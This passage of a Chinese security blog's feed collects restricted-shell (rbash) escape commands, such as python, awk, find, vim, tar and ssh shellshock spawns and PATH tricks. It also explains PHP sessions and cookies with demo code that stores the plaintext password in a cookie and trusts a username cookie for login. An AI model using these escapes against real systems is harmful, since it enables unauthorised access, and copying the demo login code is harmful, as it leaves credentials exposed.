ALL</span><br></pre></td></tr></table></figure></li><li><p>检查具有SUID权限的文件或命令</p></li><li><p>检查当前所用的shell，具体命令为：echo $SHELL 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  blog echo $SHELL</span><br><span class="line">/bin/zsh</span><br></pre></td></tr></table></figure></li><li><p>查看当前的环境变量</p><p>env或printenv命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  blog env</span><br><span class="line">TERM_SESSION_ID&#x3D;w1t0p0:A0B301BE-DD25-4605-BC9B-7B6F99E2BF38</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;private&#x2F;tmp&#x2F;com.apple.launchd.zvhBmnseo7&#x2F;Listeners</span><br><span class="line">LC_TERMINAL_VERSION&#x3D;3.3.9</span><br><span class="line">COLORFGBG&#x3D;15;0</span><br><span class="line">ITERM_PROFILE&#x3D;Default</span><br><span class="line">XPC_FLAGS&#x3D;0x0</span><br><span class="line">LANG&#x3D;zh_CN.UTF-8</span><br></pre></td></tr></table></figure></li></ul><h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><h4 id="编程语言绕过"><a href="#编程语言绕过" class="headerlink" title="编程语言绕过"></a>编程语言绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) 使用 except &gt; except spawn sh，然后执行sh</span><br><span class="line">2) 使用 python &gt; python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line">3) 使用 php &gt; php -a ，然后执行 exec(&quot;sh -i&quot;);</span><br><span class="line">4) 使用 perl &gt; perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br><span class="line">5) 使用 lua &gt; os.execute(&#39;&#x2F;bin&#x2F;sh&#39;).</span><br><span class="line">6) 使用 ruby &gt; exec &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure><h4 id="常见绕过技术"><a href="#常见绕过技术" class="headerlink" title="常见绕过技术"></a>常见绕过技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）如果允许使用“&#x2F;”的话，则可以运行&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash。</span><br><span class="line">2）如果可以运行cp命令，则可以将&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash复制到自己的目录中。</span><br><span class="line">3) 使用 ftp &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>) 使用 gdb &gt; !/bin/sh 或者 !/bin/bash</span><br><span class="line"></span><br><span class="line">[steady@gongxinao ~]$ gdb</span><br><span class="line">GNU gdb (GDB) Red Hat Enterprise Linux <span class="number">7.6</span><span class="number">.1</span><span class="number">-119.</span>el7</span><br><span class="line">Copyright (C) <span class="number">2013</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> <span class="keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This <span class="keyword">is</span> free software: you are free to change <span class="keyword">and</span> redistribute it.</span><br><span class="line">There <span class="keyword">is</span> NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line"><span class="keyword">and</span> <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured <span class="keyword">as</span> <span class="string">&quot;x86_64-redhat-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">(gdb) !/bin/sh</span><br><span class="line">sh<span class="number">-4.2</span>$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5) 使用 more&#x2F;man&#x2F;less &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br><span class="line">less 和 more阅读页面时候，也会进入命令模式，键入q则会直接退出，如果键入 !&#39;sh&#39; 则会进入一个shell。</span><br><span class="line">6) 使用 vim &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 或者 set shell&#x3D;&#x2F;bin&#x2F;bash shell</span><br><span class="line">vi steady.txt 方法vi进入编辑器命令模式</span><br><span class="line">:!&#x2F;bin&#x2F;bash   输入&#x2F;bin&#x2F;bash</span><br><span class="line">7) 使用 rvim &gt; :python import os; os.system(&quot;&#x2F;bin&#x2F;bash )</span><br><span class="line">8) 使用 scp &gt; scp -S &#x2F;path&#x2F;yourscript x y:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9) 使用 awk &gt; awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br><span class="line">sh-4.2$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10) 使用 find &gt; find &#x2F; -name test -exec &#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><h4 id="其他技术"><a href="#其他技术" class="headerlink" title="其他技术"></a>其他技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)使用 ssh &gt; ssh username@IP - t &quot;&#x2F;bin&#x2F;sh&quot; 或者 &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">2)使用 ssh2 &gt; ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">3)使用 ssh3 &gt; ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot; (shellshock)</span><br><span class="line">通过ssh链接当前IP的当前用户并启动&#x2F;bin&#x2F;bash，主要用到了ssh命令的t参数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4)使用 ssh4 &gt; ssh -o ProxyCommand&#x3D;&quot;sh -c &#x2F;tmp&#x2F;yourfile.sh&quot; 127.0.0.1 (SUID)</span><br><span class="line">5)使用 git &gt; git help status &gt; ，然后就可以运行 !&#x2F;bin&#x2F;bash了</span><br><span class="line">6)使用 pico &gt; pico -s &quot;&#x2F;bin&#x2F;bash&quot; ，然后就可以对 &#x2F;bin&#x2F;bash 执行写操作，最后执行 CTRL + T</span><br><span class="line">7)使用 zip &gt; zip &#x2F;tmp&#x2F;test.zip &#x2F;tmp&#x2F;test -T --unzip-command&#x3D;&quot;sh -c&#x2F;bin&#x2F;bash&quot;</span><br><span class="line">8)使用 tar &gt; tar cf &#x2F;dev&#x2F;null testfile --checkpoint&#x3D;1 --checkpointaction&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><p>查看当前用户是否对环境变量有写的权限。如果有w权限我们就可以修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare -x PATH=<span class="string">&quot;/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/steady/.local/bin:/home/steady/bin&quot;</span></span><br><span class="line">declare -x PWD=<span class="string">&quot;/home/steady&quot;</span></span><br><span class="line">declare -x QT_IM_MODULE=<span class="string">&quot;ibus&quot;</span></span><br><span class="line">declare -x SESSION_MANAGER=<span class="string">&quot;local/unix:@/tmp/.ICE-unix/1942,unix/unix:/tmp/.ICE-unix/1942&quot;</span></span><br><span class="line">declare -x SHELL=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure><p>如果具有写入的权限，呢么我们可以把/bin/bash添加到环境变量$PATH中。$PATH是一个Linux的环境变量，用于命令搜索。</p><p>/bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。当时我们输入pwd的时候计算机首先去/bin中去查找，发现存在pwd命令，可以使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>所以我们在讲/bin/bash输入到PATH中，我们输入/bin/bash就会切换一个shell。进而达到了绕过rbash的目的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rbash绕过&quot;&gt;&lt;a href=&quot;#Rbash绕过&quot; class=&quot;headerlink&quot; title=&quot;Rbash绕过&quot;&gt;&lt;/a&gt;Rbash绕过&lt;/h1&gt;&lt;h3 id=&quot;什么是受限shell环境&quot;&gt;&lt;a href=&quot;#什么是受限shell环境&quot; class=&quot;</summary>
      
    
    
    
    <category term="Linux提权" scheme="http://s1eady.top/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linux" scheme="http://s1eady.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>session、cookie原理</title>
    <link href="http://s1eady.top/2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/"/>
    <id>http://s1eady.top/2019/02/05/session%E3%80%81cookie%E5%8E%9F%E7%90%86/</id>
    <published>2019-02-04T18:40:36.000Z</published>
    <updated>2020-10-16T11:46:56.900Z</updated>
    
    <content type="html"><![CDATA[<h3 id="session、cookie原理"><a href="#session、cookie原理" class="headerlink" title="session、cookie原理"></a>session、cookie原理</h3><h5 id="登陆前"><a href="#登陆前" class="headerlink" title="登陆前"></a>登陆前</h5><p>session_start()</p><ul><li><p>用户第一次访问文件(含有session_start函数的文件)</p><p>用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器</p><p>比如:</p><p>我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在</p><p>cookie中不会存在任何PHPSESSID值</p><p>没有访问服务器之前,我们的请求是不会带上PHPSESSID的</p></li><li><p>用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值</p><p>然后我们在每一个请求服务器的时候都会带上PHPSESSID</p></li></ul><h5 id="登陆后"><a href="#登陆后" class="headerlink" title="登陆后"></a>登陆后</h5><p>登陆之后,通过以下代码设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br></pre></td></tr></table></figure><p>我们在前端可以使用js获取到cookie值</p><h5 id="HttpOnly设置"><a href="#HttpOnly设置" class="headerlink" title="HttpOnly设置"></a>HttpOnly设置</h5><p>每个<code>cookie</code>都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过<code>cookie</code>选项来设置的，<code>cookie</code>选项包括：<code>expires</code>、<code>domain</code>、<code>path</code>、<code>secure</code>、<code>HttpOnly</code>。在设置任一个<code>cookie</code>时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**<code>分号</code><strong>和一个</strong><code>空格</code>**隔开。</p><p>这个选项用来设置<code>cookie</code>是否能通过 <code>js</code> 去访问。默认情况下，<code>cookie</code>不会带<code>httpOnly</code>选项(即为空)，所以默认情况下，客户端是可以通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>的。当<code>cookie</code>带<code>httpOnly</code>选项时，客户端则无法通过<code>js</code>代码去访问（包括读取、修改、删除等）这个<code>cookie</code>。</p><h6 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h6><p>只有设置了<code>setcookie</code>的第七个参数为<code>true</code>的时候 <code>document.cookie</code>才是空的,即使在<code>php.ini</code>里面设置了<code>session.cookie_httponly=On</code>并且设置了<code>session.cookie_httponly </code>这个属性<code>(ini_set(&quot;session.cookie_httponly&quot;, 1);)</code>，但是在浏览器还是能获取到<code>cookie</code>的信息,只要<code>setcookie</code>的第七个参数不设置为<code>true</code>,<code>document.cookie</code>依然能取到值。</p><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p>login.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line"> &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; </span><br><span class="line"> &lt;title&gt;会员登录&lt;&#x2F;title&gt; </span><br><span class="line"> &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; </span><br><span class="line">  ul li&#123;margin:0;padding:0;&#125; </span><br><span class="line">  form&#123;margin:40px 30px 0;&#125; </span><br><span class="line">  form li&#123;list-style:none;padding:5px 0;&#125; </span><br><span class="line">  form li label&#123;float:left;width:70px;text-align:right&#125; </span><br><span class="line">  form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; </span><br><span class="line">  .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; </span><br><span class="line">  form li img&#123;vertical-align:top&#125; </span><br><span class="line"> &lt;&#x2F;style&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; </span><br><span class="line"> &lt;fieldset&gt; </span><br><span class="line">  &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; </span><br><span class="line">  &lt;ul&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">   &lt;li&gt; </span><br><span class="line">    &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; </span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; </span><br><span class="line">   &lt;&#x2F;li&gt; </span><br><span class="line">  &lt;&#x2F;ul&gt; </span><br><span class="line"> &lt;&#x2F;fieldset&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line"> session_start(); </span><br><span class="line"> if(isset($_POST[&#39;login&#39;])) </span><br><span class="line"> &#123; </span><br><span class="line">  $username &#x3D; trim($_POST[&#39;username&#39;]); </span><br><span class="line">  $password &#x3D; trim($_POST[&#39;password&#39;]); </span><br><span class="line">  if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span class="line">   echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;用户名或密码错误 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;login.html&#39;); </span><br><span class="line">   echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; </span><br><span class="line">   exit; </span><br><span class="line">  &#125; </span><br><span class="line">  else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) </span><br><span class="line">  &#123; </span><br><span class="line">   &#x2F;&#x2F;登录成功将信息保存到session中 </span><br><span class="line">   $_SESSION[&#39;username&#39;]&#x3D;$username; </span><br><span class="line">   $_SESSION[&#39;islogin&#39;]&#x3D;1; </span><br><span class="line">   &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie </span><br><span class="line">   if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,$username,time()+7*24*60*60); </span><br><span class="line">    setcookie(&quot;code&quot;,$password,time()+7*24*60*60); </span><br><span class="line">   &#125; </span><br><span class="line">   else </span><br><span class="line">   &#123; </span><br><span class="line">    setcookie(&quot;username&quot;,&#39;&#39;,time()-1); </span><br><span class="line">    setcookie(&quot;code&quot;,&#39;&#39;,time()-1); </span><br><span class="line">   &#125; </span><br><span class="line">   &#x2F;&#x2F;跳转到用户首页 </span><br><span class="line">   header(&#39;refresh:3;url&#x3D;index.php&#39;); </span><br><span class="line">  &#125; </span><br><span class="line"> &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//首先判断Cookie是否有记住用户信息 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;username&#x27;</span>]=$_COOKIE[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">  $_SESSION[<span class="string">&#x27;islogin&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;islogin&#x27;</span>])) </span><br><span class="line"> &#123; </span><br><span class="line">  <span class="comment">//已经登录 </span></span><br><span class="line">  <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line"> &#123; <span class="comment">//为登录 </span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"> &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>Logout.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"> session_start(); </span><br><span class="line"> <span class="comment">//清除session </span></span><br><span class="line"> $username=$_SESSION[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"> $_SESSION=<span class="keyword">array</span>(); </span><br><span class="line"> session_destroy(); </span><br><span class="line"> <span class="comment">//清除cookie </span></span><br><span class="line"> setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> setcookie(<span class="string">&quot;code&quot;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-1</span>); </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$username</span>,欢迎下次光临&quot;</span>; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h5 id="session与cookie的区别"><a href="#session与cookie的区别" class="headerlink" title="session与cookie的区别"></a>session与cookie的区别</h5><p>Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器</p><p>网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。</p><p>cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。</p><p>服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。</p><p>cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的</p><p>session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。</p><p>1、存储方式不同</p><p>Cookie中只能保管ASCII字符串</p><p>Session中能够存取任何类型的数据</p><p>2、隐私策略的不同</p><p>Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。</p><p>Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险</p><p>3、跨域支持上的不同</p><p>Cookie支持跨域名访问</p><p>Session仅在他所在的域名内有效</p><p>4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的；</p><p>5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session；</p><p>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE；</p><p>6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K；</p><h5 id="cookie如何生成？"><a href="#cookie如何生成？" class="headerlink" title="cookie如何生成？"></a>cookie如何生成？</h5><p>1、由服务端生成，在返回包中的set-cookie选项设置cookie。</p><p>2、前端浏览器通过js设置cookie。</p><h5 id="什么是session？"><a href="#什么是session？" class="headerlink" title="什么是session？"></a>什么是session？</h5><p>Session是一种协议，是保持用户状态的协议</p><p>客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;session、cookie原理&quot;&gt;&lt;a href=&quot;#session、cookie原理&quot; class=&quot;headerlink&quot; title=&quot;session、cookie原理&quot;&gt;&lt;/a&gt;session、cookie原理&lt;/h3&gt;&lt;h5 id=&quot;登陆前&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Cookie与Session" scheme="http://s1eady.top/tags/Cookie%E4%B8%8ESession/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与CSP</title>
    <link href="http://s1eady.top/2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/"/>
    <id>http://s1eady.top/2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/</id>
    <published>2019-01-10T12:11:17.000Z</published>
    <updated>2020-10-16T11:46:27.581Z</updated>
    
